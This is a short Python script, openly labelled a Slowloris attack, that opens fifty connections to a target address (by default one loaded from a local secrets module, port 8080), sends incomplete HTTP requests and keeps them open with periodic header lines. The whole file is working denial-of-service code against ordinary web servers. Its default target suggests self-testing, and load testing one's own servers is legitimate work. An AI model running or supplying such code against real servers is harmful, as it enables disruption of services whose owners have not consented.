import socket, time
from secrets_loader import MY_IP

def main(target_ip=MY_IP, target_port=8080, num_sockets=50):
    print(f"[+] Starting Slowloris attack on {target_ip}:{target_port}")
    sockets = []
    for i in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: %b\r\n" % target_ip.encode())
            sockets.append(s)
            print(f"[+] Socket {i} opened")
        except Exception as e:
            print(f"[-] Failed socket {i}: {e}")

    # Keep them alive
    for _ in range(5):
        for i, s in enumerate(sockets):
            try:
                s.send(b"X-a: keep-alive\r\n")
            except Exception:
                pass
        time.sleep(5)

    for s in sockets:
        s.close()
    print("[+] Slowloris complete")

if __name__ == "__main__":
    main()
